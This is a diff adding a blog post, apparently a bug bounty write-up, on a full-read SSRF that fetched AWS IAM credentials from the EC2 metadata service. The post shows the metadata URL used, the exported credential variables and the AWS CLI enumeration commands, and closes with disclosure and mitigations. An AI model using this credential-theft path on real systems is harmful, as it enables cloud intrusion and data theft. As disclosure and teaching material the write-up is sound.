@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        SSRF to fetch AWS credentials with full access to multiple services ::
+        zonduu
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="
+TL;DR#A seemingly-blank, unauthenticated page exposed a parameter that allowed server-side request forgery (SSRF). The endpoint base64-encoded full responses (not just images), which let us read the EC2 Instance Metadata Service (IMDS) and obtain temporary AWS credentials with broad permissions. With those credentials we enumerated hundreds of S3 buckets and queried EC2 resources.
+Background#I found a path on a subdomain that looked nearly blank and had a few query parameters. Those parameters were initially vulnerable to XSS and one of them (I’ll redact the real name; here I call it urlLogo) appeared to accept a URL and fetch it server-side.
+"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://zonduu.me/posts/critical-ssrf/" />
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<link rel="stylesheet" href="https://zonduu.me/style.css" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://zonduu.me/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://zonduu.me/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SSRF to fetch AWS credentials with full access to multiple services">
+  <meta name="twitter:description" content="How I found an SSRF to fetch AWS credentials with full access to multiple services.">
+
+
+
+<meta property="og:url" content="https://zonduu.me/posts/critical-ssrf/">
+  <meta property="og:site_name" content="zonduu">
+  <meta property="og:title" content="SSRF to fetch AWS credentials with full access to multiple services">
+  <meta property="og:description" content="How I found an SSRF to fetch AWS credentials with full access to multiple services.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-05-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-05-01T00:00:00+00:00">
+
+
+
+
+<meta name="google-adsense-account" content="ca-pub-6629477156127628">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >root@localhost:~#</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+    <span class="header__right">
+      
+      
+
+      
+      <a class="posts-link" href="/posts/">Posts</a>
+      <span class="separator">|</span>
+
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">SSRF to fetch AWS credentials with full access to multiple services</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2020-05-01
+        </time>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p><img src="/ssrf-0.jpg" alt="Proof image"></p>
+<h2 id="tldr">
+  TL;DR
+  <a href="#tldr" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>A seemingly-blank, unauthenticated page exposed a parameter that allowed server-side request forgery (SSRF). The endpoint base64-encoded <strong>full</strong> responses (not just images), which let us read the EC2 Instance Metadata Service (IMDS) and obtain temporary AWS credentials with broad permissions. With those credentials we enumerated hundreds of S3 buckets and queried EC2 resources.</p>
+<hr>
+<h2 id="background">
+  Background
+  <a href="#background" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>I found a path on a subdomain that looked nearly blank and had a few query parameters. Those parameters were initially vulnerable to XSS and one of them (I’ll redact the real name; here I call it <code>urlLogo</code>) appeared to accept a URL and fetch it server-side.</p>
+<p>The path looked like:</p>
+<pre tabindex="0"><code>https://host/payment/?urlLogo=...
+</code></pre><p>Because the page returned almost nothing, I treated this as a potential blind SSRF and began fuzzing it to understand how the server behaved when given different remote hosts and ports.</p>
+<hr>
+<h2 id="discovery">
+  Discovery
+  <a href="#discovery" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>I tested <code>urlLogo</code> by giving it known-good and known-bad hosts and observing timeouts and response differences (e.g. <code>zonduu.me</code>, <code>invalid.host</code>, port 80 vs 555). I used Burp Suite Intruder to drive SSRF payloads and inspected responses.</p>
+<p>When inspecting responses, I noticed an <code>&lt;img&gt;</code> element containing a base64 payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:image/png;base64,BASE64VALUE...&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span>/&gt;
+</span></span></code></pre></div><p>Different input URLs produced <em>different</em> base64 blobs. That indicated the server was embedding the response of the fetched URL (or some encoding of it) into the returned HTML — not just fetching image resources.</p>
+<p>Initially I assumed the server only fetched image endpoints, but a quick check (and a heads-up from a friend) revealed the server base64-encoded <strong>the full response body</strong> for whatever URL we provided — regardless of content-type. This made the issue a <strong>full-read SSRF</strong>.</p>
+<hr>
+<h2 id="exploitation">
+  Exploitation
+  <a href="#exploitation" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>We requested the EC2 metadata URL that returns IAM role credentials:</p>
+<pre tabindex="0"><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+</code></pre><p>After decoding the base64 payload returned in the page, we found credentials like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Code&#34;</span>: <span style="color:#e6db74">&#34;Success&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;LastUpdated&#34;</span>: <span style="color:#e6db74">&#34;2021-01-26T23:02:52Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Type&#34;</span>: <span style="color:#e6db74">&#34;AWS-HMAC&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;AccessKeyId&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;SecretAccessKey&#34;</span>: <span style="color:#e6db74">&#34;REDACTED&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Token&#34;</span>: <span style="color:#e6db74">&#34;REDACTED==&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Expiration&#34;</span>: <span style="color:#e6db74">&#34;2021-01-27T05:06:28Z&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We exported them into our shell to test:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export AWS_ACCESS_KEY_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REDACTED&#34;</span>
+</span></span><span style="display:flex;"><span>export AWS_SECRET_ACCESS_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REDACTED&#34;</span>
+</span></span><span style="display:flex;"><span>export AWS_SESSION_TOKEN<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;REDACTED&#34;</span>
+</span></span></code></pre></div><p>They worked.</p>
+<hr>
+<h2 id="what-we-could-access">
+  What we could access
+  <a href="#what-we-could-access" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Using the temporary credentials we tested common AWS read/write calls. The keys allowed the following (examples):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 ls
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &gt; listed 200+ internal company buckets</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aws ec2 describe-instances --region eu-west-2
+</span></span><span style="display:flex;"><span>aws ec2 describe-security-groups --region eu-west-2
+</span></span><span style="display:flex;"><span>aws ec2 describe-vpcs --region eu-west-2
+</span></span><span style="display:flex;"><span>aws ec2 describe-images --region eu-west-2
+</span></span></code></pre></div><p>The <code>s3 ls</code> command listed <strong>over 200 internal buckets</strong>. The EC2 queries returned instance and VPC metadata. Based on additional checks, the credentials appeared to have broad privileges — potentially full access across multiple AWS services — which meant huge impact (read, delete, create, modify resources).</p>
+<hr>
+<h2 id="impact">
+  Impact
+  <a href="#impact" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>A full-read SSRF to the EC2 metadata service that returns working AWS credentials is a <strong>critical</strong> issue:</p>
+<ul>
+<li>Exfiltrate sensitive data from internal S3 buckets (data leakage).</li>
+<li>Create, delete, or modify EC2 instances and other infrastructure.</li>
+<li>Pivot within the cloud environment, provision new resources, or persist access.</li>
+</ul>
+<p>This is one of the most severe classes of cloud issues you can find in a bug bounty program.</p>
+<hr>
+<h2 id="disclosure--reward">
+  Disclosure &amp; Reward
+  <a href="#disclosure--reward" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>I reported the issue and it was triaged as maximum impact. A few days later the team awarded the maximum bounty plus a bonus. (I was happy with the fix and the response — the impact warranted it.)</p>
+<p><img src="/ssrf-1.jpg" alt="Proof image"></p>
+<hr>
+<h2 id="notes--mitigations">
+  Notes &amp; Mitigations
+  <a href="#notes--mitigations" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>If you’re a developer or reviewer, consider:</p>
+<ul>
+<li><strong>Never</strong> fetch attacker-controlled URLs directly. Restrict allowed hosts (whitelisting) and disallow requests to internal CIDR ranges like <code>169.254.169.254</code>.</li>
+<li>Validate and sanitize URL inputs thoroughly.</li>
+<li>Use network egress filtering for servers that don&rsquo;t need to access internal cloud metadata.</li>
+<li>IMDSv2 should be enforced where possible; it reduces the risk of SSRF-based metadata leaks.</li>
+</ul>
+<hr>
+<h2 id="final-thoughts">
+  Final thoughts
+  <a href="#final-thoughts" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>This was a simple but critical bug: a small, otherwise-innocent parameter that fetched arbitrary URLs and returned the raw response back to the client (encoded). Small surface area, huge impact.</p>
+<hr>
+<p>Follow me on twitter <a href="https://twitter.com/zonduu1">https://twitter.com/zonduu1</a> so you can see where I publish new write-up in my own website.</p>
+<p>— zonduu</p>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+   
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+  </body>
+</html>
